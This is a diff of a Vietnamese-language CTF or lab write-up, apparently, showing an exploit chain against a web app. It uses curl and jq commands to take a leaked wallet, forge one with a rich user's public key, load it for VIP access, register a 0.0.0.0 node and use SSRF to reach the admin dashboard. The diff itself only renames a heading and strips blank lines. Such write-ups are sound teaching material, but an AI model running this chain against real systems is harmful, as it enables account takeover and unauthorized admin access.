@@ -13,7 +13,7 @@ weight: 100
 ## Tóm tắt chain 
 
 ## Step by step 
-### Web interface 
+### User to admin  
 
 - Found `/blockchain` api công khai toàn bộ lịch sử giao dịch 
 ![alt text](image.png)
@@ -42,12 +42,7 @@ weight: 100
     -d 'filename=fresh' \
     "$BASE/dashboard/wallet" \
     -o fresh.json
-
- 
-
   jq -r '.private_key' fresh.json
-
-  
 
   ### 2. Tạo wallet ghép
 
@@ -56,10 +51,6 @@ weight: 100
   jq --arg pub "$RICH_PUBLIC" \
     '.public_key = $pub' \
     fresh.json > forged.json
-
- 
-
-  
 
   ### 3. Load wallet VIP
 
@@ -70,8 +61,6 @@ weight: 100
     -F 'file=@forged.json' \
     "$BASE/dashboard/wallet" \
     -o load-result.html
-
- 
 
   grep -i 'Wallet loaded successfully' load-result.html
 
@@ -86,8 +75,6 @@ weight: 100
     "$BASE/dashboard/vip/nodes" \
     -o register.html
 
-  
-
   grep -i 'Node registered' register.html
 
   ### 5. Lấy Node ID
@@ -99,15 +86,11 @@ weight: 100
 
   grep -nE '0\.0\.0\.0|testNode' nodes.html
 
- 
-
   ### 6. Test SSRF và vào Admin
   curl -sS \
     -b "$JAR" \
     "$BASE/dashboard/vip/nodes/test_node/0" \
     -o admin.html
-
-  
 
   grep -i 'Admin Dashboard' admin.html
 
